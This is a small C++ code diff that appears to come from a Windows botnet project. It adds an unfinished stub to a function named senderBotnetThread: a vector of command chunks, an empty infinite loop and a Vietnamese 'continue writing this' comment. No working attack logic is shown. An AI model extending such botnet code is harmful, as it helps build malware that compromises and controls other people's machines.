@@ -13,6 +13,15 @@ void EnqueueSend(const std::string& s) {
 DWORD senderBotnetThread(LPVOID lpParam)
 {
     while (!should_stop_sender) {
+
+        vector<string> command_chunks;
+        int chunk_index = 0;
+
+        while (true)
+        {
+            // TODO: viet tiep phan nay
+        }
+
         std::string dataToSend;
 
         // Check queue
